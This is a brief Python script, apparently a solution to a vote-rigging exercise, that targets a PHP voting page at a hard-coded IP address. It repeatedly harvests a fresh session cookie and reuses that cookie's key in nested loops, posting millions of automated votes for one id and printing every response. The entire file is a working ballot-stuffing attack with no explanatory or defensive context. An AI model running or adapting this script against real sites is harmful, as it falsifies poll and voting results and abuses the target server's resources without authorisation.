#!/usr/bin/python3
import requests
import time
from pprint import pprint

cp = 0
#r = requests.get('http://httpbin.org/headers', headers=headers)
for i in range(0, 1022):
    r = requests.get('http://158.69.76.135/level1.php')
    print(r.cookies.get_dict())
    #print(r.text)
    cookies = r.cookies.get_dict()
    key1 = cookies.get('HoldTheDoor')
    for i in range(0, 3050):
        r = requests.post('http://158.69.76.135/level1.php', cookies = cookies, data = {'id':'2490', 'holdthedoor':'Envoyer', 'key': key1})
        print(r.text)
